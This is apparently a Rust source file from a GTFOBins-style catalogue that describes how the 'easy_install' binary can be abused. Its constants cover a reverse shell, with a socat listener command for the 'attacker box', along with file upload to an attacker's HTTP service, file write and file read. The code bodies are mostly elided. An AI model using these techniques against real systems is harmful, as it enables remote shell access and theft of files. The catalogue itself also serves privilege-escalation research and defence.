pub static BIN_NAME: &'static str = "easy_install";
...
pub static RS_DESC: &'static str =
    "Run `socat file:`tty`,raw,echo=0 tcp-listen:12345` on the attacker box to receive a shell.";
pub static RS_CODE: &'static str = r#"
    ...
    easy_install $TF
"#;
pub static FU_DESC_1: &'static str = r#"Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."#;
...
pub static FW_CODE: &'static str = r#"
    ...
    easy_install $TF
"#;
pub static FR_DESC: &'static str = "The read file content is wrapped within program messages.";
